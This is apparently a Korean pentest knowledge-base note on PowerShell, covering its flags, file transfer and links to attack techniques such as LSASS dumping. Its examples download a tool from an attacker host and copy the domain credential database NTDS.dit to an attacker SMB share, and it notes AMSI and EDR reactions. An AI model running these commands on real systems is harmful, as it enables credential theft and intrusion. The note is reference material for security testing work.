---
tags:
  - 환경/windows
  - 기능/원격실행
  - 기능/파일전송
실행환경: ["Windows"]
필요권한: ["Windows 셸"]
필요조건: ["실행할 명령, 스크립트 또는 파일 경로"]
결과: ["정보", "파일", "명령 실행"]
---

# powershell

## 도구 개요

PowerShell은 Windows에서 cmdlet·.NET API·스크립트를 실행해 시스템 관리, 정보 조회, 파일 전송과 원격 작업을 자동화하는 셸이다. 기본 명령을 조합하거나 다른 PowerShell 기반 도구를 실행할 때 널리 사용되며, PowerShell 실행 가능 여부와 관리자 권한은 별개다.

## 필요한 입력과 실행 환경

- 실행 환경: PowerShell이 설치된 Windows 셸 또는 원격 PowerShell 세션
- 입력: 실행할 명령 문자열, `.ps1` 파일 또는 UTF-16LE Base64 명령
- 파일 전송 입력: HTTP(S) URL·출력 경로 또는 접근 가능한 UNC 경로
- 기능별 조건: 사용하는 cmdlet과 대상 리소스에 맞는 현재 세션 권한
- `<URL>`은 다운로드 서버의 전체 URL(예: `https://files.example.invalid/report.ps1`)이고 `<OUT_FILE>`은 현재 PowerShell 세션 호스트의 경로다. Base64 입력은 UTF-16LE로 인코딩한 명령 문자열에서 만들며, 원격 세션의 경로와 로컬 경로를 같은 값으로 쓰지 않는다.

## 표준 사용법

`<COMMAND>`은 현재 PowerShell session에서 실행할 문자열, `<BASE64_COMMAND>`는 그 문자열을 UTF-16LE로 인코딩한 값이다. `<URL>`은 전체 HTTP(S) URL, `<OUT_FILE>`·UNC path는 해당 PowerShell session host에서 해석하며, 다운로드 성공은 파일 실행이나 remote command 성공을 뜻하지 않는다.

```powershell
powershell.exe [options] -Command <command>
```

## 대표 예시

### 프로필 없이 단일 명령 실행

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "whoami; hostname"
```

### 인코딩된 PowerShell payload 실행

```powershell
powershell -EncodedCommand <base64_utf16le_command>
```

### HTTP로 도구 다운로드

```powershell
Invoke-WebRequest http://<ATTACKER_IP>/tool.exe -OutFile C:\Windows\Temp\tool.exe
```

### SMB share로 파일 복사

```powershell
Copy-Item C:\NTDS\NTDS.dit \\<ATTACKER_IP>\CompData\NTDS.dit
```


## 주요 옵션과 명령

| 옵션·명령 | 의미 | 사용하는 상황 |
|---|---|---|
| `-NoProfile` | 사용자 profile 로딩 생략 | profile 영향 없이 일관된 명령 실행 |
| `-ExecutionPolicy Bypass` | 현재 프로세스의 실행 정책 지정 | 정책 때문에 스크립트가 시작되지 않을 때 |
| `-Command` | 명령 문자열 실행 | 한 줄 명령 실행 |
| `-File` | 스크립트 파일 실행 | 로컬 `.ps1` 실행 |
| `-EncodedCommand` | UTF-16LE Base64 명령 실행 | 인코딩된 명령 전달 |
| `Invoke-WebRequest` | HTTP(S) 요청과 파일 다운로드 | 원격 파일을 `-OutFile`로 저장 |
| `Copy-Item` | 로컬 또는 UNC 경로 파일 복사 | SMB 공유를 통한 파일 이동 |

## 도구 고유 출력

| 출력/상태 | 의미 | 다음 행동 |
|---|---|---|
| 명령 출력 반환 | Windows 명령 실행 성공 | 현재 사용자, 권한, 작업 디렉터리 확인 |
| 파일 다운로드/실행 성공 | 후속 도구 전달 가능 | 실행 정책, AV/EDR 반응, 파일 위치 확인 |
| execution policy/AMSI 차단 | 스크립트 실행 제한 | 실행 정책, language mode, Defender/AMSI 반응 확인 |
| 원격 명령 실패 | WinRM/권한/네트워크 문제 | 세션 권한, 포트, 인증 방식, 방화벽 확인 |

## 관련 공격기법

- [[상황별 파일 전송]]
- [[제한 환경 파일 반입]]
- [[WinRM 원격 PowerShell 세션]]
- [[Windows 파일 자격증명 검색]]
- [[LSASS 메모리 덤프]]
- [[Windows 이벤트 로그에서 민감 명령줄 검색]]
- [[Hyper-V VM 내보내기와 가상 디스크 오프라인 수집]]
- [[DnsAdmins WPAD DNS 레코드로 NTLM 인증 유도]]
